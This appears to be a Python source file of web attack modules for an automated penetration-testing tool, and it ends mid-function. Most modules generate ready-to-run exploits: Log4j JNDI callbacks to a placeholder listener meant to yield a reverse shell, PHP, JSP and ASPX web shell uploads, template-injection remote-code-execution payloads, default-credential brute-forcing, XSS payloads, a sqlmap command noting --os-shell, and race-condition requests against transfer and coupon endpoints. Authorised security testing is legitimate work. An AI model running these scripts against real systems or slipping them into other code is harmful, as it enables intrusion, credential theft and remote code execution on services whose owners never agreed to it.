"""Attack modules: web."""

from __future__ import annotations

from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


class Log4jRCE(AttackModule):
    name = "Log4jRCE"
    description = "Log4j JNDI injection RCE (CVE-2021-44228)"
    target_services = ["http", "https"]
    target_ports = [8080, 8443, 80, 443]
    required_cves = ["CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105", "CVE-2021-44832"]
    # Phase 3: version-gated -- Log4j 2.0-beta9 through 2.14.1 (2.15.0 still
    # vulnerable to CVE-2021-45046).
    target_versions = {
        "http": [
            "log4j 2.0",
            "log4j 2.1",
            "log4j 2.2",
            "log4j 2.3",
            "log4j 2.4",
            "log4j 2.5",
            "log4j 2.6",
            "log4j 2.7",
            "log4j 2.8",
            "log4j 2.9",
            "log4j 2.10",
            "log4j 2.11",
            "log4j 2.12",
            "log4j 2.13",
            "log4j 2.14",
            "log4j 2.15",
        ],
        "https": ["log4j 2.0", "log4j 2.14", "log4j 2.15"],
    }
    # Capability metadata: remote RCE primitive -- a confirmed JNDI callback is
    # a reverse shell + foothold. No prerequisites (works against any vulnerable
    # Log4j endpoint); callback host is an operator parameter, not an artifact.
    requires: list[str] = []
    produces: list[str] = ["shell", "foothold"]
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Inject ${jndi:ldap://<callback>:1389/a} into any HTTP header or "
                "parameter. Callback host must be in exploit.allowed_targets. "
                "On callback confirmation the orchestrator sets shell_type=reverse."
            ),
            # Phase 3: this recipe represents a real compromise path -- declare
            # the intent signals so record_success can act on a confirmed
            # callback (the dispatch classifier fills evidence).
            "shell_type": "reverse",
            "privilege_level": "user",
            "evidence": [f"Log4j JNDI payloads queued against {ctx.target_ip}"],
            "references": [
                "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
                "https://www.lunasec.io/docs/blog/log4j-zero-day/",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import socket, sys
# Lightweight Log4j JNDI payload sender
# Target: {ctx.target_ip}
# Usage: python log4j_poc.py <target_host> <target_port>
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
# Phase 3: inject into MULTIPLE headers (User-Agent, Referer, X-Forwarded-For,
# X-Api-Version, Authorization, Host) + query params -- the old script only
# covered X-Api-Version. Callback host is a placeholder the operator replaces
# with their allowlisted listener.
CALLBACK_HOST = "<CALLBACK_HOST>"
CALLBACK_PORT = "1389"
payload = b"GET /?q=${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}} HTTP/1.1\\r\\n"
payload += b"Host: " + host.encode() + b"\\r\\n"
payload += b"User-Agent: ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n"
payload += b"Referer: ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n"
payload += b"X-Forwarded-For: ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n"
payload += b"X-Api-Version: ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n"
payload += b"Authorization: Bearer ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n\\r\\n"
s = socket.socket()
s.connect((host, port))
s.send(payload)
print(s.recv(4096).decode(errors="replace"))
s.close()
"""


class BasicAuthBuster(AttackModule):
    name = "BasicAuthBuster"
    description = "Brute-force HTTP Basic Auth with small default wordlist"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443]
    required_cves = []
    # Capability metadata: a successful basic-auth brute yields credentials.
    requires: list[str] = []
    produces: list[str] = ["credentials"]
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Tests basic creds against HTTP basic auth. May trip rate limits.",
            "credentials_found": ["<VALID_CREDS: printed by script on SUCCESS>"],
            "evidence": [f"basic-auth credential test queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/Brute_force_attack",
                "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import urllib.request, base64, sys
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
creds = [("admin","admin"),("root","root"),("user","user"),("admin","password"),("guest","guest")]
for u,p in creds:
    req = urllib.request.Request(f"http://{{host}}:{{port}}/")
    creds_b64 = base64.b64encode(f"{{u}}:{{p}}".encode()).decode()
    req.add_header("Authorization", f"Basic {{creds_b64}}")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            if resp.status < 400:
                print(f"SUCCESS: {{u}}/{{p}}")
                break
    except Exception:
        pass
"""


class APIFuzzer(AttackModule):
    name = "APIFuzzer"
    description = "Fuzz common REST API endpoints for information disclosure or injection"
    target_services = ["http", "https", "api"]
    target_ports = [80, 443, 8080, 3000, 5000, 8000, 8443]
    required_cves = []
    # Capability metadata: endpoint fuzzing surfaces routes, not artifacts.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "low"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Fuzzes /api, /v1, /graphql, etc. for 200/403 differences.",
            "evidence": [f"API fuzzing queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/API_Parameter_Tampering",
                "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/api-endpoint.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import urllib.request, json, sys
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
paths = ["/api","/api/v1","/v1","/graphql","/rest","/swagger.json","/openapi.json","/api/users","/api/admin"]
for p in paths:
    try:
        req = urllib.request.Request(f"http://{{host}}:{{port}}{{p}}")
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read(2048).decode(errors="replace")
            print(f"{{p}} -> {{resp.status}} ({{len(body)}} bytes)")
    except urllib.error.HTTPError as e:
        print(f"{{p}} -> {{e.code}}")
    except Exception:
        pass
"""


class WebShellUpload(AttackModule):
    name = "WebShellUpload"
    description = "Upload PHP/JSP/ASPX web shell via file upload vulnerabilities"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 8000, 3000]
    required_cves = []
    # Capability metadata: a confirmed upload is a webshell foothold.
    requires: list[str] = []
    produces: list[str] = ["webshell", "foothold"]
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Attempts to upload web shells with various extensions and bypasses. "
                "On WEBSHELL_CONFIRMED the orchestrator sets shell_type=webshell."
            ),
            # Phase 3: a successful upload is a real foothold path.
            "shell_type": "webshell",
            "privilege_level": "user",
            "evidence": [f"webshell upload attempts queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/Unrestricted_File_Upload",
                "https://book.hacktricks.wiki/en/pentesting-web/file-upload.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        # Phase 2: `requests` is NOT a declared dependency (requirements.txt /
        # pyproject.toml) -- the old script died with ModuleNotFoundError on a
        # fresh install. Rewritten with stdlib urllib (multipart hand-rolled,
        # ~10 lines) so it runs anywhere with zero new deps.
        return f"""import sys, uuid, urllib.request, urllib.error
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
scheme = "https" if port in (443, 8443) else "http"
url = f"{{scheme}}://{{host}}:{{port}}"
shells = [
    ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
    ("shell.phtml", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
    ("shell.jsp", b"<% Runtime.getRuntime().exec(request.getParameter(\\"cmd\\")); %>", "application/jsp"),
    ("shell.aspx", b"<%@ Page Language=\\"C#\\" %><% System.Diagnostics.Process.Start(\\"cmd.exe\\", \\"/c \\" + Request[\\"cmd\\"]); %>", "application/aspx"),
]
boundary = "----breachpilot" + uuid.uuid4().hex
for filename, content, ctype in shells:
    try:
        body = (
            f"--{{boundary}}\\r\\n"
            f'Content-Disposition: form-data; name="file"; filename="{{filename}}"\\r\\n'
            f"Content-Type: {{ctype}}\\r\\n\\r\\n"
        ).encode() + content + f"\\r\\n--{{boundary}}--\\r\\n".encode()
        req = urllib.request.Request(
            f"{{url}}/upload", data=body, method="POST",
            headers={{"Content-Type": f"multipart/form-data; boundary={{boundary}}"}},
        )
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            status = getattr(resp, "status", 200)
        except urllib.error.HTTPError as e:
            status = e.code
        if status in (200, 201, 302):
            print(f"UPLOAD SUCCESS: {{filename}} (status {{status}})")
            break
    except Exception as e:
        print(f"{{filename}} failed: {{e}}")
"""


class SQLInjection(AttackModule):
    name = "SQLInjection"
    description = "Automated SQL injection testing with sqlmap integration"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000, 8000, 8888]
    required_cves = []
    # Capability metadata: advisory info-stub (sqlmap recipe). The module itself
    # does not execute; sqlmap escalation can yield a webshell foothold, but
    # that is a downstream tool outcome, not a module artifact.
    requires: list[str] = []
    produces: list[str] = []
    read_only = True
    cost = "low"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Use sqlmap for comprehensive SQL injection testing. "
                "sqlmap is Linux-attacker only; on Windows use the urllib-based "
                "blind-SQLi probe script. --os-shell / --file-write escalate to "
                "a webshell foothold."
            ),
            evidence=[f"SQLi testing planned against {ctx.target_ip}"],
            references=[
                "https://sqlmap.org",
                "https://owasp.org/www-community/attacks/SQL_Injection",
            ],
            suggested_command=(
                f"sqlmap -u 'http://{ctx.target_ip}/page.php?id=1' --batch --crawl=2 --forms --level=3 --risk=2"
            ),
            techniques=["union", "error", "time", "stacked"],
        )


class XSSScanner(AttackModule):
    name = "XSSScanner"
    description = "Reflected and stored XSS payload injection"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443]
    required_cves = []
    # Capability metadata: reflected-XSS detection -- surfaces a finding, no
    # foothold/credential artifact.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "low"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Tests common XSS payloads against URL parameters and forms.",
            "evidence": [f"XSS payload injection queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/xss/",
                "https://portswigger.net/web-security/cross-site-scripting",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        # Phase 2: `requests` is NOT a declared dependency -- rewritten with
        # stdlib urllib so the generated script runs on a fresh install.
        return f"""import sys, urllib.request, urllib.parse, urllib.error, ssl
# Target: {ctx.target_ip}
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
scheme = "https" if port in (443, 8443) else "http"
base = f"{{scheme}}://{{host}}:{{port}}"
ctx_ssl = ssl.create_default_context()
ctx_ssl.check_hostname = False
ctx_ssl.verify_mode = ssl.CERT_NONE
payloads = [
    '''<script>alert('XSS')</script>''',
    '''<img src=x onerror=alert('XSS')>''',
    ''''"><script>alert('XSS')</script>''',
    '''<body onload=alert('XSS')>''',
]
for payload in payloads:
    try:
        url = f"{{base}}/search?q={{urllib.parse.quote(payload)}}"
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=10, context=ctx_ssl)
        text = resp.read().decode(errors="replace")
        if payload in text:
            print(f"XSS REFLECTED: {{payload[:50]}}")
            break
    except Exception as e:
        pass
"""


# ---------------------------------------------------------------------------
# Credential Operations
# ---------------------------------------------------------------------------


class SSTIProbe(AttackModule):
    name = "SSTIProbe"
    description = "Server-Side Template Injection detection and exploitation (Jinja2, Twig, Freemarker, Velocity)"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []
    # Capability metadata: SSTI detection; a confirmed SSTI escalates to RCE
    # via the inline RCE probe payloads (shell), but the module surfaces the
    # finding rather than declaring a foothold.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Probes for SSTI across Jinja2, Twig, Freemarker, Velocity, Smarty, and Mako engines.",
            "evidence": [f"SSTI probes queued against {ctx.target_ip}"],
            "references": [
                "https://portswigger.net/web-security/server-side-template-injection",
                "https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""SSTI Probe — detect and fingerprint template injection across engines."""
import sys, urllib.request, urllib.parse, urllib.error, re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"

# Polyglot payloads that trigger different engines
MATH_PAYLOADS = [
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("${{7*7}}", "49", "Freemarker"),
    ("#{{7*7}}", "49", "Velocity"),
    ("{{=7*7}}", "49", "Mako"),
    ("{{7*'7'}}", "7777777", "Jinja2"),
    ("<% out.println(7*7); %>", "49", "JSP/EL"),
]

# RCE test payloads (only after confirming SSTI)
RCE_PAYLOADS = [
    ("Jinja2", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
    ("Jinja2", "{{''.__class__.__mro__[1].__subclasses__()}}"),
    ("Twig", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"),
    ("Freemarker", "<#assign ex='freemarker.template.utility.Execute'?new()> ${{ex('id')}}"),
    ("Velocity", "#set($x='')$x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')"),
    ("Smarty", "{{system('id')}}"),
]

def test_endpoint(url: str, param_name: str = "q"):
    """Test a single endpoint for SSTI."""
    print(f"\\nTesting: {{url}}")
    for payload, expected, engine in MATH_PAYLOADS:
        try:
            test_url = f"{{url}}?{{param_name}}={{urllib.parse.quote(payload)}}"
            req = urllib.request.Request(test_url)
            with urllib.request.urlopen(req, timeout=8) as resp:
                body = resp.read(8192).decode(errors="replace")
                if expected in body:
                    print(f"  [SSTI DETECTED] {{engine}} — payload '{{payload}}' reflected with {{expected}}")
                    return engine
        except urllib.error.HTTPError as e:
            body = e.read().decode(errors="replace")
            if expected in body:
                print(f"  [SSTI DETECTED] {{engine}} — payload '{{payload}}' reflected in error {{e.code}}")
                return engine
        except Exception:
            pass
    return None

# Test common endpoints
endpoints = ["/", "/search", "/profile", "/user", "/page", "/render", "/preview", "/template"]
params = ["q", "search", "name", "username", "id", "page", "input", "data", "template"]

found_engine = None
for ep in endpoints:
    for param in params:
        engine = test_endpoint(f"{{BASE}}{{ep}}", param)
        if engine:
            found_engine = engine
            break
    if found_engine:
        break

if found_engine:
    print(f"\\n[+] Confirmed SSTI in {{found_engine}}. Attempting RCE probes...")
    for engine_name, rce_payload in RCE_PAYLOADS:
        if engine_name == found_engine:
            try:
                test_url = f"{{BASE}}/?q={{urllib.parse.quote(rce_payload)}}"
                req = urllib.request.Request(test_url)
                with urllib.request.urlopen(req, timeout=10) as resp:
                    body = resp.read(8192).decode(errors="replace")
                    print(f"  RCE probe sent: {{rce_payload[:60]}}...")
                    print(f"  Response: {{body[:500]}}")
            except Exception as e:
                print(f"  RCE probe error: {{e}}")
else:
    print("\\n[-] No SSTI detected on common endpoints.")
'''


class GraphQLIntrospect(AttackModule):
    name = "GraphQLIntrospect"
    description = "GraphQL schema extraction, query depth abuse, batching attacks, and introspection"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 4000, 5000]
    required_cves = []
    # Capability metadata: schema introspection is enumeration -- it surfaces
    # types/fields, not a foothold or credential.
    requires: list[str] = []
    produces: list[str] = []
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Extracts GraphQL schema via introspection, tests query depth limits, and batch attacks.",
            "evidence": [f"GraphQL introspection queued against {ctx.target_ip}"],
            "references": [
                "https://portswigger.net/web-security/graphql",
                "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        target = ctx.target_ip
        return (
            '"""GraphQL Introspection & Attack Toolkit."""\n'
            "import json, sys, urllib.request, urllib.error\n"
            "\n"
            f'TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target}"\n'
            "PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80\n"
            'SCHEME = "https" if PORT in (443, 8443) else "http"\n'
            'BASE = f"{SCHEME}://{TARGET}:{PORT}"\n'
            "\n"
            'INTROSPECTION_QUERY = """\n'
            "query IntrospectionQuery {\n"
            "  __schema {\n"
            "    queryType { name }\n"
            "    mutationType { name }\n"
            "    subscriptionType { name }\n"
            "    types {\n"
            "      name kind description\n"
            "      fields { name description type { name kind ofType { name kind } } args { name description type { name kind } } }\n"
            "      inputFields { name description type { name kind } }\n"
            "      enumValues { name description }\n"
            "    }\n"
            "    directives { name description locations args { name description type { name kind } } }\n"
            "  }\n"
            "}\n"
            '"""\n'
            "\n"
            'DEPTH_ATTACK_QUERY = """\n'
            "query DeepQuery {\n"
            "  level0: __typename\n"
            "  {nested}\n"
            "}\n"
            '"""\n'
            "\n"
            "BATCH_ATTACK = [\n"
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            "]\n"
            "\n"
            'ALIAS_ATTACK = "query AliasedQuery { " + " ".join(f"a{i}: __typename" for i in range(100)) + " }"\n'
            "\n"
            "def graphql_request(endpoint, query):\n"
            '    """Send a GraphQL request and return parsed response."""\n'
            "    if isinstance(query, str):\n"
            '        payload = {"query": query}\n'
            "    elif isinstance(query, list):\n"
            "        payload = query\n"
            "    else:\n"
            "        payload = query\n"
            "    data = json.dumps(payload).encode()\n"
            "    try:\n"
            '        req = urllib.request.Request(endpoint, data=data, headers={"Content-Type": "application/json"}, method="POST")\n'
            "        with urllib.request.urlopen(req, timeout=15) as resp:\n"
            "            return json.loads(resp.read().decode())\n"
            "    except urllib.error.HTTPError as e:\n"
            '        return {"error": e.code, "body": e.read().decode(errors="replace")[:500]}\n'
            "    except Exception as e:\n"
            '        return {"error": str(e)}\n'
            "\n"
            'graphql_endpoints = ["/graphql", "/gql", "/api/graphql", "/v1/graphql", "/query", "/graphiql"]\n'
            "found_endpoint = None\n"
            "for ep in graphql_endpoints:\n"
            '    url = f"{BASE}{ep}"\n'
            '    result = graphql_request(url, "{ __typename }")\n'
            '    if "data" in result and "__typename" in str(result.get("data", {})):\n'
            "        found_endpoint = url\n"
            '        print(f"[+] GraphQL endpoint found: {url}")\n'
            "        break\n"
            '    elif "error" not in result:\n'
            '        print(f"[?] Possible GraphQL at {url}: {json.dumps(result)[:200]}")\n'
            "\n"
            "if not found_endpoint:\n"
            '    print("[-] No GraphQL endpoint found. Trying common paths anyway...")\n'
            '    found_endpoint = f"{BASE}/graphql"\n'
            "\n"
            'print(f"\\n=== Testing: {found_endpoint} ===\\n")\n'
            "\n"
            'print("[1] Schema Introspection...")\n'
            "intro_result = graphql_request(found_endpoint, INTROSPECTION_QUERY)\n"
            'if "data" in intro_result and intro_result["data"].get("__schema"):\n'
            '    schema = intro_result["data"]["__schema"]\n'
            '    types_count = len(schema.get("types", []))\n'
            '    print(f"  [+] Introspection ENABLED! {types_count} types exposed.")\n'
            '    for t in schema.get("types", [])[:20]:\n'
            '        name = t.get("name", "?")\n'
            '        kind = t.get("kind", "?")\n'
            '        fields = [f.get("name", "?") for f in t.get("fields", [])[:5]] if t.get("fields") else []\n'
            "        if fields:\n"
            "            print(f\"    {kind} {name}: {', '.join(fields)}\")\n"
            "else:\n"
            '    print(f"  [-] Introspection disabled or blocked: {json.dumps(intro_result)[:200]}")\n'
            "\n"
            'print("\\n[2] Query Depth Attack...")\n'
            "depth = 50\n"
            'nested = "\\n  ".join(f"level{i}: __typename {{ level{i+1}: __typename" for i in range(depth))\n'
            'nested += "\\n  " + "}" * depth\n'
            'depth_query = DEPTH_ATTACK_QUERY.replace("{nested}", nested)\n'
            "depth_result = graphql_request(found_endpoint, depth_query)\n"
            'if "error" in str(depth_result).lower() or "depth" in str(depth_result).lower():\n'
            '    print(f"  [+] Depth limit enforced: {json.dumps(depth_result)[:300]}")\n'
            "else:\n"
            '    print(f"  [!] No depth limit detected ({depth} levels accepted)")\n'
            "\n"
            'print("\\n[3] Batching Attack (10 queries in one request)...")\n'
            "batch_result = graphql_request(found_endpoint, BATCH_ATTACK)\n"
            "if isinstance(batch_result, list) and len(batch_result) == 10:\n"
            '    print(f"  [+] Batching ENABLED! {len(batch_result)} responses returned.")\n'
            "else:\n"
            '    print(f"  [-] Batching blocked: {json.dumps(batch_result)[:200]}")\n'
            "\n"
            'print("\\n[4] Alias Attack (100 aliases)...")\n'
            "alias_result = graphql_request(found_endpoint, ALIAS_ATTACK)\n"
            'if "data" in alias_result:\n'
            '    count = len(alias_result.get("data", {}))\n'
            '    print(f"  [+] Alias attack accepted: {count} aliases processed")\n'
            "else:\n"
            '    print(f"  [-] Alias attack blocked: {json.dumps(alias_result)[:200]}")\n'
            "\n"
            'print("\\n[!] Use extracted schema to find sensitive queries, mutations, and IDOR vectors.")\n'
        )


# ---------------------------------------------------------------------------
# Race Condition & Timing Attack Modules
# ---------------------------------------------------------------------------


class RaceRequest(AttackModule):
    name = "RaceRequest"
    description = (
        "Send N concurrent requests to exploit TOCTOU race conditions (coupon reuse, limit bypass, double-spend)"
    )
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []
    # Capability metadata: race-condition exploitation; a successful bypass
    # surfaces a finding, not a durable artifact.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Sends concurrent requests to exploit race conditions in rate limits, coupon codes, and transactions.",
            "evidence": [f"race-condition probes queued against {ctx.target_ip}"],
            "references": [
                "https://portswigger.net/web-security/race-conditions",
                "https://book.hacktricks.wiki/en/pentesting-web/race-condition.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""Race Condition Exploit — concurrent request sender for TOCTOU attacks."""
import concurrent.futures, json, sys, threading, time, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"
CONCURRENT = int(sys.argv[3]) if len(sys.argv) > 3 else 20

results = {{"success": 0, "failure": 0, "responses": []}}
lock = threading.Lock()

def send_request(url: str, method: str = "POST", data: bytes = b"", headers: dict = None) -> dict:
    """Send a single request and return status."""
    hdrs = headers or {{}}
    try:
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read(2048).decode(errors="replace")
            with lock:
                results["success"] += 1
                results["responses"].append({{"status": resp.status, "body": body[:200]}})
            return {{"status": resp.status, "success": True}}
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        with lock:
            results["failure"] += 1
            results["responses"].append({{"status": e.code, "body": body[:200]}})
        return {{"status": e.code, "success": False}}
    except Exception as e:
        with lock:
            results["failure"] += 1
        return {{"error": str(e)}}

# Test endpoints commonly vulnerable to race conditions
test_cases = [
    {{
        "name": "Coupon/Code Redemption",
        "url": f"{{BASE}}/api/redeem",
        "method": "POST",
        "data": json.dumps({{"code": "TEST100", "user": "attacker"}}).encode(),
        "headers": {{"Content-Type": "application/json"}},
    }},
    {{
        "name": "Vote/Like Endpoint",
        "url": f"{{BASE}}/api/vote",
        "method": "POST",
        "data": json.dumps({{"item_id": "1", "vote": "up"}}).encode(),
        "headers": {{"Content-Type": "application/json"}},
    }},
    {{
        "name": "Transfer/Transaction",
        "url": f"{{BASE}}/api/transfer",
        "method": "POST",
        "data": json.dumps({{"to": "attacker", "amount": 100}}).encode(),
        "headers": {{"Content-Type": "application/json"}},
    }},
    {{
        "name": "Rate Limit Bypass",
        "url": f"{{BASE}}/api/login",
        "method": "POST",
        "data": json.dumps({{"username": "admin", "password": "test"}}).encode(),
        "headers": {{"Content-Type": "application/json"}},
    }},
]

print(f"=== Race Condition Attack: {{BASE}} ===\\n")

for tc in test_cases:
    print(f"\\n[Test] {{tc['name']}}: {{tc['url']}}")
    print(f"  Sending {{CONCURRENT}} concurrent requests...")

    results = {{"success": 0, "failure": 0, "responses": []}}
    start = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENT) as executor:
        futures = [
            executor.submit(
                send_request,
                tc["url"],
                tc.get("method", "POST"),
                tc.get("data", b""),
                tc.get("headers"),
            )
            for _ in range(CONCURRENT)
        ]
        concurrent.futures.wait(futures)

    elapsed = time.time() - start
    print(f"  Completed in {{elapsed:.2f}}s")
    print(f"  Success: {{results['success']}}, Failure: {{results['failure']}}")

    # Analyze for race condition indicators
    statuses = [r.get("status") for r in results["responses"]]
    unique_statuses = set(statuses)
    if len(unique_statuses) > 1:
        print(f"  [!] Mixed status codes: {{unique_statuses}} — possible race condition!")
    if results["success"] > 1:
        print(f"  [!] {{results['success']}} requests succeeded — limit may be bypassed!")

    # Show sample responses
    for i, r in enumerate(results["responses"][:3]):
        print(f"  Response {{i+1}}: status={{r.get('status')}} body={{r.get('body', '')[:100]}}")

print("\\n[!] For advanced race testing, use Turbo Intruder (Burp) or custom async scripts.")
'''


class TimingOracle(AttackModule):
    name = "TimingOracle"
    description = "Detect timing side-channels in auth/validation endpoints for user enumeration and blind extraction"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443]
    required_cves = []
    # Capability metadata: timing side-channel detection = enumeration (user
    # enumeration, blind extraction). Read-only: only measures response times.
    requires: list[str] = []
    produces: list[str] = []
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Measures response time differences to detect user enumeration, blind SQLi, and timing oracles.",
            "evidence": [f"timing-oracle measurements queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/Timing_Attacks",
                "https://portswigger.net/web-security/sql-injection/blind",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""Timing Oracle Detector — find side-channels in auth and validation."""
import json, statistics, sys, time, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"
SAMPLES = 10
THRESHOLD_MS = 50  # Significant timing difference threshold

def measure_request(url: str, method: str = "POST", data: bytes = b"", headers: dict = None) -> list[float]:
    """Measure response time over multiple samples."""
    times = []
    hdrs = headers or {{}}
    for _ in range(SAMPLES):
        try:
            req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
            start = time.perf_counter()
            with urllib.request.urlopen(req, timeout=10) as resp:
                resp.read()
            elapsed = (time.perf_counter() - start) * 1000
            times.append(elapsed)
        except urllib.error.HTTPError as e:
            elapsed = (time.perf_counter() - start) * 1000
            times.append(elapsed)
            e.read()
        except Exception:
            pass
        time.sleep(0.1)  # Small delay between samples
    return times

def analyze_timing(name: str, times_a: list[float], times_b: list[float]) -> dict:
    """Compare two timing distributions."""
    if len(times_a) < 3 or len(times_b) < 3:
        return {{"significant": False, "reason": "insufficient samples"}}

    mean_a = statistics.mean(times_a)
    mean_b = statistics.mean(times_b)
    stdev_a = statistics.stdev(times_a) if len(times_a) > 1 else 0
